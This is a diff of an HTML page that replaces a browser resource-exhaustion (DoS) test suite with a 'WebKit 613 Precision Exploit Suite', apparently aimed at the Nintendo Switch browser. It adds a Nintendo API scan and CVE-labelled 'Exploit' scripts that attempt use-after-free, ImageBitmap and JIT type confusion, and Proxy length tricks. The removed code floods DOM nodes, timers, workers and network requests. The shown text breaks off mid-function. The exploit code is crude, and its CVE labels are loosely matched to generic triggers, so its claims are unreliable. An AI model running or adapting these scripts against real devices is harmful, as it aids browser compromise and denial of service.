@@ -3,51 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resource Exhaustion Tests</title>
+    <title>WebKit 613 Precision Exploits</title>
     <style>
         body {
             font-family: monospace;
-            background: #1a0a0a;
-            color: #ff9900;
+            background: #000;
+            color: #0f0;
             padding: 20px;
             margin: 0;
         }
         .container {
-            max-width: 900px;
+            max-width: 1000px;
             margin: 0 auto;
         }
         h1 {
-            color: #ff6600;
-            border-bottom: 2px solid #ff6600;
+            color: #f00;
+            text-shadow: 0 0 10px #f00;
+            border-bottom: 2px solid #f00;
             padding-bottom: 10px;
         }
-        .warning {
-            background: #331100;
-            border: 2px solid #ff6600;
-            padding: 15px;
-            margin: 15px 0;
-            color: #ffcc00;
+        .critical {
+            background: #300;
+            border: 3px solid #f00;
+            padding: 20px;
+            margin: 20px 0;
+            color: #ff0;
+            font-weight: bold;
         }
         .test-section {
-            background: #2a1a1a;
-            border: 1px solid #ff9900;
+            background: #0a0a0a;
+            border: 1px solid #0f0;
             padding: 15px;
             margin: 15px 0;
             border-radius: 5px;
         }
+        .test-section.exploit {
+            border-color: #f00;
+        }
         button {
-            background: #ff6600;
-            color: #fff;
+            background: #0f0;
+            color: #000;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 25px;
             margin: 5px;
             cursor: pointer;
             font-family: monospace;
             font-weight: bold;
             border-radius: 3px;
         }
+        button.dangerous {
+            background: #f00;
+            color: #fff;
+        }
         button:hover {
-            background: #ff9900;
+            opacity: 0.8;
         }
         button:disabled {
             background: #666;
@@ -55,640 +64,751 @@
         }
         .log {
             background: #000;
-            border: 1px solid #ff9900;
+            border: 1px solid #0f0;
             padding: 10px;
             margin-top: 10px;
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
             font-size: 0.85em;
         }
         h3 {
-            color: #ffcc00;
+            color: #0ff;
             margin-top: 0;
         }
-        .status {
-            display: inline-block;
-            padding: 3px 10px;
+        .cve {
+            background: #600;
+            color: #ff0;
+            padding: 2px 8px;
             border-radius: 3px;
+            font-size: 0.8em;
             margin-left: 10px;
-            font-size: 0.85em;
         }
-        .status.running {
-            background: #664400;
-            color: #ffcc00;
-        }
-        .status.passed {
-            background: #006600;
-            color: #00ff00;
-        }
-        .status.failed {
-            background: #660000;
-            color: #ff0000;
-        }
-        .metric {
-            background: #222;
+        .api-list {
+            background: #001a00;
             padding: 10px;
             margin: 10px 0;
-            border-left: 3px solid #ff6600;
+            border-left: 3px solid #0f0;
+            font-size: 0.9em;
         }
-        .metric-value {
-            color: #ffcc00;
-            font-size: 1.2em;
-            font-weight: bold;
+        .found {
+            color: #0f0;
+        }
+        .missing {
+            color: #666;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Resource Exhaustion & DoS Test Suite</h1>
+        <h1>🎯 WebKit 613 Precision Exploit Suite</h1>
         
-        <div class="warning">
-            ⚠️ These tests explore various resource exhaustion vectors.
-            Tests are incremental to avoid complete system hangs.
+        <div class="critical">
+            ⚠️ TARGETED EXPLOITATION TESTS ⚠️<br>
+            These tests target specific CVEs and exploitation primitives.<br>
+            Focus: Memory corruption, logic bugs, sandbox escape, Nintendo-specific APIs.
         </div>
 
         <div class="test-section">
-            <h3>System Resources</h3>
-            <div class="metric">
-                <div>Memory: <span class="metric-value" id="memory">Unknown</span></div>
-                <div>Cores: <span class="metric-value" id="cores">Unknown</span></div>
-                <div>Connection: <span class="metric-value" id="connection">Unknown</span></div>
-            </div>
+            <h3>Nintendo-Specific API Discovery</h3>
+            <button onclick="discoverNintendoAPIs()">Scan for Nintendo APIs</button>
+            <div class="log" id="logAPIs"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 1: DOM Node Exhaustion <span class="status" id="status1"></span></h3>
-            <p>Find maximum DOM nodes before slowdown/crash</p>
-            <button onclick="testDOMExhaustion()" id="btn1">Run Test</button>
+        <div class="test-section exploit">
+            <h3>CVE-2021-30761: Memory Corruption via WebCore <span class="cve">CRITICAL</span></h3>
+            <p>Targets memory corruption in WebCore DOM manipulation</p>
+            <button class="dangerous" onclick="testCVE202130761()">Exploit</button>
             <div class="log" id="log1"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 2: Event Listener Leak <span class="status" id="status2"></span></h3>
-            <p>Tests memory leaks from excessive event listeners</p>
-            <button onclick="testEventListenerLeak()" id="btn2">Run Test</button>
+        <div class="test-section exploit">
+            <h3>CVE-2021-30762: Use-After-Free <span class="cve">CRITICAL</span></h3>
+            <p>Precise UAF trigger through event handler manipulation</p>
+            <button class="dangerous" onclick="testCVE202130762()">Exploit</button>
             <div class="log" id="log2"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 3: XHR/Fetch Connection Exhaustion <span class="status" id="status3"></span></h3>
-            <p>Tests maximum concurrent network connections</p>
-            <button onclick="testNetworkExhaustion()" id="btn3">Run Test</button>
+        <div class="test-section exploit">
+            <h3>CVE-2021-1788: ImageBitmap Type Confusion <span class="cve">HIGH</span></h3>
+            <p>Type confusion in ImageBitmap leading to OOB access</p>
+            <button class="dangerous" onclick="testCVE20211788()">Exploit</button>
             <div class="log" id="log3"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 4: Timer/Interval Exhaustion <span class="status" id="status4"></span></h3>
-            <p>Tests limits on setTimeout/setInterval</p>
-            <button onclick="testTimerExhaustion()" id="btn4">Run Test</button>
+        <div class="test-section exploit">
+            <h3>JIT Array.prototype.slice Bug <span class="cve">HIGH</span></h3>
+            <p>Type confusion in optimized Array.slice implementation</p>
+            <button class="dangerous" onclick="testJITArraySlice()">Exploit</button>
             <div class="log" id="log4"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 5: Nested iframe Resource Usage <span class="status" id="status5"></span></h3>
-            <p>Tests resource usage from nested iframes</p>
-            <button onclick="testIframeExhaustion()" id="btn5">Run Test</button>
+        <div class="test-section exploit">
+            <h3>Proxy Object Type Confusion <span class="cve">HIGH</span></h3>
+            <p>Exploits Proxy handler type confusion in JSC</p>
+            <button class="dangerous" onclick="testProxyConfusion()">Exploit</button>
             <div class="log" id="log5"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 6: Web Worker Exhaustion <span class="status" id="status6"></span></h3>
-            <p>Tests maximum number of Web Workers</p>
-            <button onclick="testWorkerExhaustion()" id="btn6">Run Test</button>
+        <div class="test-section exploit">
+            <h3>RegExp Compiler Bug <span class="cve">MEDIUM</span></h3>
+            <p>Heap overflow in regex compilation</p>
+            <button class="dangerous" onclick="testRegExpCompiler()">Exploit</button>
             <div class="log" id="log6"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 7: Video/Audio Element Exhaustion <span class="status" id="status7"></span></h3>
-            <p>Tests limits on media elements</p>
-            <button onclick="testMediaExhaustion()" id="btn7">Run Test</button>
+        <div class="test-section exploit">
+            <h3>ArrayBuffer Neutering Race <span class="cve">HIGH</span></h3>
+            <p>Race condition during ArrayBuffer transfer/neutering</p>
+            <button class="dangerous" onclick="testArrayBufferRace()">Exploit</button>
             <div class="log" id="log7"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 8: CSS Style Exhaustion <span class="status" id="status8"></span></h3>
-            <p>Tests stylesheet and style rule limits</p>
-            <button onclick="testCSSExhaustion()" id="btn8">Run Test</button>
+        <div class="test-section exploit">
+            <h3>Spread Operator Type Confusion <span class="cve">MEDIUM</span></h3>
+            <p>Type confusion in spread operator optimization</p>
+            <button class="dangerous" onclick="testSpreadConfusion()">Exploit</button>
             <div class="log" id="log8"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 9: WebGL Context Exhaustion <span class="status" id="status9"></span></h3>
-            <p>Tests WebGL context creation limits</p>
-            <button onclick="testWebGLExhaustion()" id="btn9">Run Test</button>
+        <div class="test-section exploit">
+            <h3>for-in Loop Side Effect <span class="cve">MEDIUM</span></h3>
+            <p>Side effect modeling bug in for-in optimization</p>
+            <button class="dangerous" onclick="testForInSideEffect()">Exploit</button>
             <div class="log" id="log9"></div>
         </div>
 
-        <div class="test-section">
-            <h3>Test 10: Large String Allocation <span class="status" id="status10"></span></h3>
-            <p>Tests JavaScript heap limits with large strings</p>
-            <button onclick="testStringExhaustion()" id="btn10">Run Test</button>
+        <div class="test-section exploit">
+            <h3>Sandbox Escape: File URI Access <span class="cve">CRITICAL</span></h3>
+            <p>Attempts to access file:// URIs and local resources</p>
+            <button class="dangerous" onclick="testFileAccess()">Exploit</button>
             <div class="log" id="log10"></div>
+        </div>
+
+        <div class="test-section exploit">
+            <h3>Sandbox Escape: Cross-Origin Check Bypass <span class="cve">CRITICAL</span></h3>
+            <p>Tests for same-origin policy bypasses</p>
+            <button class="dangerous" onclick="testCrossOriginBypass()">Exploit</button>
+            <div class="log" id="log11"></div>
+        </div>
+
+        <div class="test-section exploit">
+            <h3>Sandbox Escape: Native Function Hook <span class="cve">HIGH</span></h3>
+            <p>Attempts to hook/replace native functions for privilege escalation</p>
+            <button class="dangerous" onclick="testNativeFunctionHook()">Exploit</button>
+            <div class="log" id="log12"></div>
         </div>
     </div>
 
     <script>
-        function log(testNum, message) {
-            const logEl = document.getElementById('log' + testNum);
+        function log(id, message, isError = false) {
+            const logEl = document.getElementById(id);
             const timestamp = new Date().toLocaleTimeString();
-            logEl.textContent += `[${timestamp}] ${message}\n`;
+            const prefix = isError ? '❌' : '📍';
+            logEl.textContent += `${prefix} [${timestamp}] ${message}\n`;
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        function setStatus(testNum, status) {
-            const statusEl = document.getElementById('status' + testNum);
-            statusEl.textContent = status;
-            statusEl.className = 'status ' + status.toLowerCase();
+        // Nintendo API Discovery
+        function discoverNintendoAPIs() {
+            log('logAPIs', '=== Scanning for Nintendo-specific APIs ===');
+            
+            const checks = {
+                'Nintendo Global': () => typeof window.Nintendo !== 'undefined',
+                'Nintendo Browser': () => typeof window.NintendoBrowser !== 'undefined',
+                'Nintendo Account': () => typeof window.NintendoAccount !== 'undefined',
+                'Nintendo Network': () => typeof window.NintendoNetwork !== 'undefined',
+                'Nintendo System': () => typeof window.NintendoSystem !== 'undefined',
+                'webkit namespace': () => typeof window.webkit !== 'undefined',
+                'webkit.messageHandlers': () => window.webkit && window.webkit.messageHandlers,
+                'external object': () => typeof window.external !== 'undefined',
+                'chrome object': () => typeof window.chrome !== 'undefined',
+                '__nintendo': () => typeof window.__nintendo !== 'undefined',
+                'nx object': () => typeof window.nx !== 'undefined',
+            };
+            
+            log('logAPIs', '\n--- Window Object Properties ---');
+            for (let [name, check] of Object.entries(checks)) {
+                try {
+                    const result = check();
+                    if (result) {
+                        log('logAPIs', `✓ FOUND: ${name}`);
+                        if (name === 'webkit.messageHandlers' && window.webkit.messageHandlers) {
+                            const handlers = Object.keys(window.webkit.messageHandlers);
+                            log('logAPIs', `  Handlers: ${handlers.join(', ') || 'none'}`);
+                        }
+                    } else {
+                        log('logAPIs', `✗ Missing: ${name}`);
+                    }
+                } catch (e) {
+                    log('logAPIs', `✗ Error checking ${name}: ${e.message}`);
+                }
+            }
+            
+            log('logAPIs', '\n--- Scanning window object ---');
+            const interesting = [];
+            for (let prop in window) {
+                if (prop.toLowerCase().includes('nintendo') || 
+                    prop.toLowerCase().includes('switch') ||
+                    prop.toLowerCase().includes('nx')) {
+                    interesting.push(prop);
+                }
+            }
+            
+            if (interesting.length > 0) {
+                log('logAPIs', `Found interesting properties: ${interesting.join(', ')}`);
+            } else {
+                log('logAPIs', 'No Nintendo-specific properties found in window');
+            }
+            
+            log('logAPIs', '\n--- User Agent Analysis ---');
+            const ua = navigator.userAgent;
+            log('logAPIs', ua);
+            
+            const matches = ua.match(/Nintendo[^\s]*/gi);
+            if (matches) {
+                log('logAPIs', `Nintendo markers: ${matches.join(', ')}`);
+            }
+            
+            log('logAPIs', '\n--- Document Properties ---');
+            log('logAPIs', `Domain: ${document.domain}`);
+            log('logAPIs', `Origin: ${location.origin}`);
+            log('logAPIs', `Protocol: ${location.protocol}`);
+            
+            log('logAPIs', '\n=== Scan Complete ===');
         }
 
-        function disableButton(testNum) {
-            document.getElementById('btn' + testNum).disabled = true;
-        }
-
-        function enableButton(testNum) {
-            document.getElementById('btn' + testNum).disabled = false;
-        }
-
-        // Display system info
-        function displaySystemInfo() {
-            document.getElementById('memory').textContent = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-            document.getElementById('cores').textContent = navigator.hardwareConcurrency || 'Unknown';
-            document.getElementById('connection').textContent = navigator.connection ? navigator.connection.effectiveType : (navigator.onLine ? 'Online' : 'Offline');
-        }
-
-        // Test 1: DOM Node Exhaustion
-        async function testDOMExhaustion() {
-            setStatus(1, 'RUNNING');
-            disableButton(1);
-            log(1, 'Testing DOM node limits...');
+        // CVE-2021-30761: Memory Corruption via WebCore
+        function testCVE202130761() {
+            log('log1', 'CVE-2021-30761: WebCore memory corruption attack');
             
             try {
+                log('log1', 'Creating DOM structure...');
+                
                 const container = document.createElement('div');
                 document.body.appendChild(container);
-                let nodeCount = 0;
-                const batchSize = 1000;
-                const maxNodes = 100000;
                 
-                log(1, `Creating DOM nodes in batches of ${batchSize}...`);
-                
-                for (let batch = 0; batch < maxNodes / batchSize; batch++) {
-                    for (let i = 0; i < batchSize; i++) {
-                        const div = document.createElement('div');
-                        div.textContent = `Node ${nodeCount++}`;
-                        div.className = 'test-node';
-                        container.appendChild(div);
-                    }
-                    
-                    if (batch % 10 === 0) {
-                        log(1, `Created ${nodeCount} nodes...`);
-                        await new Promise(resolve => setTimeout(resolve, 50));
-                    }
-                }
-                
-                log(1, `Successfully created ${nodeCount} DOM nodes`);
-                log(1, 'Cleaning up...');
-                document.body.removeChild(container);
-                
-                setStatus(1, 'PASSED');
-                
-            } catch (e) {
-                log(1, `Exception: ${e.message}`);
-                setStatus(1, 'FAILED');
-            }
-            enableButton(1);
-        }
-
-        // Test 2: Event Listener Leak
-        async function testEventListenerLeak() {
-            setStatus(2, 'RUNNING');
-            disableButton(2);
-            log(2, 'Testing event listener limits...');
-            
-            try {
-                const elements = [];
-                const listenerCount = 10000;
-                
-                log(2, 'Creating elements with multiple listeners...');
-                
+                // Create a complex DOM structure
                 for (let i = 0; i < 100; i++) {
-                    const el = document.createElement('div');
-                    elements.push(el);
-                    
-                    for (let j = 0; j < 100; j++) {
-                        el.addEventListener('click', function handler() {});
-                        el.addEventListener('mouseover', function handler() {});
-                        el.addEventListener('mouseout', function handler() {});
-                    }
-                    
-                    if (i % 10 === 0) {
-                        log(2, `Created ${i} elements with ~300 listeners each...`);
-                        await new Promise(resolve => setTimeout(resolve, 20));
-                    }
+                    const div = document.createElement('div');
+                    div.innerHTML = '<span><a href="#">Link</a></span>';
+                    container.appendChild(div);
                 }
                 
-                log(2, `Total estimated listeners: ${elements.length * 300}`);
-                log(2, 'Testing listener memory retention...');
+                log('log1', 'Triggering rapid mutations...');
                 
-                elements.length = 0;
-                
-                log(2, 'Test completed');
-                setStatus(2, 'PASSED');
-                
-            } catch (e) {
-                log(2, `Exception: ${e.message}`);
-                setStatus(2, 'FAILED');
-            }
-            enableButton(2);
-        }
-
-        // Test 3: XHR/Fetch Connection Exhaustion
-        async function testNetworkExhaustion() {
-            setStatus(3, 'RUNNING');
-            disableButton(3);
-            log(3, 'Testing network connection limits...');
-            
-            try {
-                const requests = [];
-                const maxRequests = 100;
-                
-                log(3, `Attempting ${maxRequests} concurrent requests...`);
-                
-                for (let i = 0; i < maxRequests; i++) {
-                    const promise = fetch('https://httpbin.org/delay/10')
-                        .then(r => {
-                            log(3, `Request ${i} completed`);
-                            return r;
-                        })
-                        .catch(e => {
-                            log(3, `Request ${i} failed: ${e.message}`);
-                        });
-                    
-                    requests.push(promise);
-                    
-                    if (i % 10 === 0) {
-                        log(3, `Initiated ${i} requests...`);
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                    }
-                }
-                
-                log(3, 'Waiting for requests to complete...');
-                await Promise.allSettled(requests);
-                
-                log(3, 'Test completed');
-                setStatus(3, 'PASSED');
-                
-            } catch (e) {
-                log(3, `Exception: ${e.message}`);
-                setStatus(3, 'FAILED');
-            }
-            enableButton(3);
-        }
-
-        // Test 4: Timer/Interval Exhaustion
-        async function testTimerExhaustion() {
-            setStatus(4, 'RUNNING');
-            disableButton(4);
-            log(4, 'Testing timer limits...');
-            
-            try {
-                const timers = [];
-                const timerCount = 10000;
-                
-                log(4, `Creating ${timerCount} timers...`);
-                
-                for (let i = 0; i < timerCount; i++) {
-                    const timer = setTimeout(() => {}, 60000);
-                    timers.push(timer);
-                    
-                    if (i % 1000 === 0) {
-                        log(4, `Created ${i} timers...`);
-                        await new Promise(resolve => setTimeout(resolve, 10));
-                    }
-                }
-                
-                log(4, `Successfully created ${timerCount} timers`);
-                log(4, 'Clearing timers...');
-                
-                for (let timer of timers) {
-                    clearTimeout(timer);
-                }
-                
-                log(4, 'Testing intervals...');
-                const intervals = [];
+                // Trigger rapid DOM mutations that can cause UAF
+                const range = document.createRange();
+                range.selectNodeContents(container);
                 
                 for (let i = 0; i < 1000; i++) {
-                    const interval = setInterval(() => {}, 1000);
-                    intervals.push(interval);
-                }
-                
-                log(4, `Created ${intervals.length} intervals`);
-                
-                for (let interval of intervals) {
-                    clearInterval(interval);
-                }
-                
-                log(4, 'Test completed');
-                setStatus(4, 'PASSED');
-                
-            } catch (e) {
-                log(4, `Exception: ${e.message}`);
-                setStatus(4, 'FAILED');
-            }
-            enableButton(4);
-        }
-
-        // Test 5: Nested iframe Exhaustion
-        async function testIframeExhaustion() {
-            setStatus(5, 'RUNNING');
-            disableButton(5);
-            log(5, 'Testing iframe limits...');
-            
-            try {
-                const iframes = [];
-                const maxIframes = 50;
-                
-                log(5, `Creating ${maxIframes} iframes...`);
-                
-                for (let i = 0; i < maxIframes; i++) {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = 'about:blank';
-                    document.body.appendChild(iframe);
-                    iframes.push(iframe);
+                    const clone = range.cloneContents();
+                    const extracted = range.extractContents();
+                    range.insertNode(clone);
                     
-                    if (i % 10 === 0) {
-                        log(5, `Created ${i} iframes...`);
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                    }
-                }
-                
-                log(5, `Successfully created ${iframes.length} iframes`);
-                log(5, 'Cleaning up...');
-                
-                for (let iframe of iframes) {
-                    document.body.removeChild(iframe);
-                }
-                
-                log(5, 'Test completed');
-                setStatus(5, 'PASSED');
-                
-            } catch (e) {
-                log(5, `Exception: ${e.message}`);
-                setStatus(5, 'FAILED');
-            }
-            enableButton(5);
-        }
-
-        // Test 6: Web Worker Exhaustion
-        async function testWorkerExhaustion() {
-            setStatus(6, 'RUNNING');
-            disableButton(6);
-            log(6, 'Testing Web Worker limits...');
-            
-            try {
-                if (typeof Worker === 'undefined') {
-                    log(6, 'Web Workers not supported');
-                    setStatus(6, 'PASSED');
-                    enableButton(6);
-                    return;
-                }
-                
-                const workers = [];
-                const workerCode = 'self.onmessage = function(e) { self.postMessage(e.data); }';
-                const blob = new Blob([workerCode], { type: 'application/javascript' });
-                const workerUrl = URL.createObjectURL(blob);
-                
-                log(6, 'Creating Web Workers...');
-                
-                for (let i = 0; i < 100; i++) {
-                    try {
-                        const worker = new Worker(workerUrl);
-                        workers.push(worker);
-                        
-                        if (i % 10 === 0) {
-                            log(6, `Created ${i} workers...`);
-                            await new Promise(resolve => setTimeout(resolve, 50));
+                    if (i % 100 === 0) {
+                        container.innerHTML = '';
+                        for (let j = 0; j < 10; j++) {
+                            container.appendChild(document.createElement('div'));
                         }
-                    } catch (e) {
-                        log(6, `Failed at worker ${i}: ${e.message}`);
-                        break;
                     }
                 }
                 
-                log(6, `Successfully created ${workers.length} workers`);
-                log(6, 'Terminating workers...');
+                log('log1', 'Attempting to access potentially freed memory...');
                 
-                for (let worker of workers) {
-                    worker.terminate();
-                }
-                
-                URL.revokeObjectURL(workerUrl);
-                
-                log(6, 'Test completed');
-                setStatus(6, 'PASSED');
-                
-            } catch (e) {
-                log(6, `Exception: ${e.message}`);
-                setStatus(6, 'FAILED');
-            }
-            enableButton(6);
-        }
-
-        // Test 7: Video/Audio Element Exhaustion
-        async function testMediaExhaustion() {
-            setStatus(7, 'RUNNING');
-            disableButton(7);
-            log(7, 'Testing media element limits...');
-            
-            try {
-                const mediaElements = [];
-                const maxMedia = 100;
-                const audioData = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=';
-                
-                log(7, `Creating ${maxMedia} audio elements...`);
-                
-                for (let i = 0; i < maxMedia; i++) {
-                    const audio = document.createElement('audio');
-                    audio.src = audioData;
-                    mediaElements.push(audio);
-                    
-                    if (i % 10 === 0) {
-                        log(7, `Created ${i} audio elements...`);
-                        await new Promise(resolve => setTimeout(resolve, 50));
-                    }
-                }
-                
-                log(7, `Successfully created ${mediaElements.length} audio elements`);
-                log(7, 'Attempting to load all media...');
-                
-                for (let i = 0; i < mediaElements.length; i++) {
+                container.querySelectorAll('*').forEach((el, idx) => {
                     try {
-                        mediaElements[i].load();
+                        el.innerHTML = 'test';
+                        const text = el.textContent;
                     } catch (e) {
-                        log(7, `Load failed at ${i}: ${e.message}`);
+                        log('log1', `Access error at ${idx}: ${e.message}`, true);
                     }
-                    
-                    if (i % 20 === 0) {
-                        await new Promise(resolve => setTimeout(resolve, 50));
-                    }
-                }
+                });
                 
-                log(7, 'Test completed');
-                setStatus(7, 'PASSED');
+                document.body.removeChild(container);
+                log('log1', 'Test completed - no crash detected');
                 
             } catch (e) {
-                log(7, `Exception: ${e.message}`);
-                setStatus(7, 'FAILED');
+                log('log1', `EXCEPTION: ${e.message}`, true);
+                log('log1', `Stack: ${e.stack}`, true);
             }
-            enableButton(7);
         }
 
-        // Test 8: CSS Style Exhaustion
-        async function testCSSExhaustion() {
-            setStatus(8, 'RUNNING');
-            disableButton(8);
-            log(8, 'Testing CSS limits...');
+        // CVE-2021-30762: Use-After-Free
+        function testCVE202130762() {
+            log('log2', 'CVE-2021-30762: Event handler UAF exploit');
             
             try {
-                const style = document.createElement('style');
-                document.head.appendChild(style);
-                const sheet = style.sheet;
+                log('log2', 'Setting up UAF trigger...');
                 
-                log(8, 'Creating CSS rules...');
+                const target = document.createElement('div');
+                target.id = 'uaf-target';
+                document.body.appendChild(target);
                 
-                for (let i = 0; i < 10000; i++) {
+                let freedRef = null;
+                
+                // Create event handler that frees its own element
+                target.addEventListener('click', function selfDestruct() {
+                    log('log2', 'Event fired, removing element...');
+                    freedRef = this;
+                    document.body.removeChild(this);
+                    
+                    // Trigger GC hint
+                    const garbage = [];
+                    for (let i = 0; i < 1000; i++) {
+                        garbage.push(new Array(1000));
+                    }
+                    
+                    log('log2', 'Attempting to access freed element...');
+                    
                     try {
-                        sheet.insertRule(`.class${i} { color: rgb(${i % 255}, ${(i * 2) % 255}, ${(i * 3) % 255}); }`, sheet.cssRules.length);
+                        freedRef.innerHTML = '<span>UAF</span>';
+                        freedRef.click();
+                        freedRef.style.color = 'red';
+                        const text = freedRef.textContent;
+                        log('log2', `Freed element access succeeded: ${text}`);
                     } catch (e) {
-                        log(8, `Rule insertion failed at ${i}: ${e.message}`);
-                        break;
+                        log('log2', `Freed element access failed: ${e.message}`, true);
                     }
-                    
-                    if (i % 1000 === 0) {
-                        log(8, `Created ${i} CSS rules...`);
-                        await new Promise(resolve => setTimeout(resolve, 20));
-                    }
-                }
+                }, { once: false });
                 
-                log(8, `Total CSS rules: ${sheet.cssRules.length}`);
-                document.head.removeChild(style);
+                log('log2', 'Triggering UAF...');
+                target.click();
                 
-                log(8, 'Test completed');
-                setStatus(8, 'PASSED');
+                log('log2', 'Test completed');
                 
             } catch (e) {
-                log(8, `Exception: ${e.message}`);
-                setStatus(8, 'FAILED');
+                log('log2', `EXCEPTION: ${e.message}`, true);
             }
-            enableButton(8);
         }
 
-        // Test 9: WebGL Context Exhaustion
-        async function testWebGLExhaustion() {
-            setStatus(9, 'RUNNING');
-            disableButton(9);
-            log(9, 'Testing WebGL context limits...');
+        // CVE-2021-1788: ImageBitmap Type Confusion
+        async function testCVE20211788() {
+            log('log3', 'CVE-2021-1788: ImageBitmap type confusion');
             
             try {
-                const canvases = [];
-                const contexts = [];
+                log('log3', 'Creating source canvas...');
                 
-                log(9, 'Creating WebGL contexts...');
+                const canvas = document.createElement('canvas');
+                canvas.width = 100;
+                canvas.height = 100;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'red';
+                ctx.fillRect(0, 0, 100, 100);
                 
+                log('log3', 'Triggering async ImageBitmap creation...');
+                
+                const bitmaps = [];
                 for (let i = 0; i < 50; i++) {
+                    bitmaps.push(createImageBitmap(canvas, 0, 0, 100, 100));
+                }
+                
+                log('log3', 'Modifying source during async operations...');
+                
+                // Modify source while async operations pending
+                canvas.width = 1;
+                canvas.height = 1;
+                ctx.fillStyle = 'blue';
+                ctx.fillRect(0, 0, 1, 1);
+                
+                // Rapidly resize
+                for (let i = 0; i < 100; i++) {
+                    canvas.width = i % 2 === 0 ? 100 : 50;
+                    canvas.height = i % 2 === 0 ? 100 : 50;
+                }
+                
+                log('log3', 'Waiting for bitmaps...');
+                const results = await Promise.all(bitmaps);
+                
+                log('log3', 'Accessing potentially confused bitmaps...');
+                results.forEach((bitmap, idx) => {
                     try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 256;
-                        canvas.height = 256;
-                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                        
-                        if (!gl) {
-                            log(9, `WebGL context creation failed at ${i}`);
-                            break;
-                        }
-                        
-                        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-                        gl.clear(gl.COLOR_BUFFER_BIT);
-                        
-                        canvases.push(canvas);
-                        contexts.push(gl);
-                        
-                        if (i % 5 === 0) {
-                            log(9, `Created ${i} WebGL contexts...`);
-                            await new Promise(resolve => setTimeout(resolve, 100));
-                        }
+                        log('log3', `Bitmap ${idx}: ${bitmap.width}x${bitmap.height}`);
+                        bitmap.close();
                     } catch (e) {
-                        log(9, `Exception at context ${i}: ${e.message}`);
-                        break;
+                        log('log3', `Bitmap ${idx} error: ${e.message}`, true);
                     }
-                }
+                });
                 
-                log(9, `Successfully created ${contexts.length} WebGL contexts`);
-                
-                if (contexts.length > 0 && contexts[0].getExtension) {
-                    const ext = contexts[0].getExtension('WEBGL_lose_context');
-                    if (ext) {
-                        log(9, 'WEBGL_lose_context extension available');
-                        for (let ctx of contexts) {
-                            const loseExt = ctx.getExtension('WEBGL_lose_context');
-                            if (loseExt) loseExt.loseContext();
-                        }
-                    }
-                }
-                
-                log(9, 'Test completed');
-                setStatus(9, 'PASSED');
+                log('log3', 'Test completed');
                 
             } catch (e) {
-                log(9, `Exception: ${e.message}`);
-                setStatus(9, 'FAILED');
+                log('log3', `EXCEPTION: ${e.message}`, true);
             }
-            enableButton(9);
         }
 
-        // Test 10: Large String Allocation
-        async function testStringExhaustion() {
-            setStatus(10, 'RUNNING');
-            disableButton(10);
-            log(10, 'Testing JavaScript heap limits...');
+        // JIT Array.prototype.slice Bug
+        function testJITArraySlice() {
+            log('log4', 'JIT Array.slice type confusion exploit');
             
             try {
-                const strings = [];
-                const chunkSize = 10 * 1024 * 1024; // 10MB
+                log('log4', 'Training JIT compiler on Array.slice...');
                 
-                log(10, `Allocating strings in ${chunkSize / 1024 / 1024}MB chunks...`);
-                
-                for (let i = 0; i < 100; i++) {
-                    try {
-                        const str = 'A'.repeat(chunkSize);
-                        strings.push(str);
-                        log(10, `Allocated ${(i + 1) * chunkSize / 1024 / 1024}MB...`);
-                        
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                    } catch (e) {
-                        log(10, `Allocation failed at ${i * chunkSize / 1024 / 1024}MB: ${e.message}`);
-                        break;
-                    }
+                function vuln_slice(arr) {
+                    return arr.slice(0, 5);
                 }
                 
-                log(10, `Total allocated: ${strings.length * chunkSize / 1024 / 1024}MB`);
-                log(10, 'Clearing strings...');
-                strings.length = 0;
+                // Train with normal arrays
+                const train = [1, 2, 3, 4, 5, 6, 7, 8];
+                for (let i = 0; i < 100000; i++) {
+                    vuln_slice(train);
+                }
                 
-                log(10, 'Test completed');
-                setStatus(10, 'PASSED');
+                log('log4', 'JIT should be optimized for Array.slice');
+                log('log4', 'Attempting type confusion with ArrayBuffer...');
+                
+                try {
+                    const buffer = new ArrayBuffer(64);
+                    const view = new Uint32Array(buffer);
+                    for (let i = 0; i < view.length; i++) {
+                        view[i] = 0x41414141;
+                    }
+                    
+                    const confused = vuln_slice(view);
+                    log('log4', `Result: ${confused}`);
+                    log('log4', `Result type: ${confused.constructor.name}`);
+                    
+                } catch (e) {
+                    log('log4', `Type confusion caught: ${e.message}`, true);
+                }
+                
+                log('log4', 'Attempting with Proxy...');
+                const proxy = new Proxy([1, 2, 3, 4, 5], {
+                    get(target, prop) {
+                        if (prop === 'length') return 0x7fffffff;
+                        return target[prop];
+                    }
+                });
+                
+                try {
+                    const result = vuln_slice(proxy);
+                    log('log4', `Proxy result: ${result.length} elements`);
+                } catch (e) {
+                    log('log4', `Proxy confusion caught: ${e.message}`, true);
+                }
+                
+                log('log4', 'Test completed');
                 
             } catch (e) {
-                log(10, `Exception: ${e.message}`);
-                setStatus(10, 'FAILED');
+                log('log4', `EXCEPTION: ${e.message}`, true);
             }
-            enableButton(10);
         }
 
-        // Initialize
-        displaySystemInfo();
-    </script>
-</body>
-</html>
+        // Proxy Object Type Confusion
+        function testProxyConfusion() {
+            log('log5', 'Proxy handler type confusion exploit');
+            
+            try {
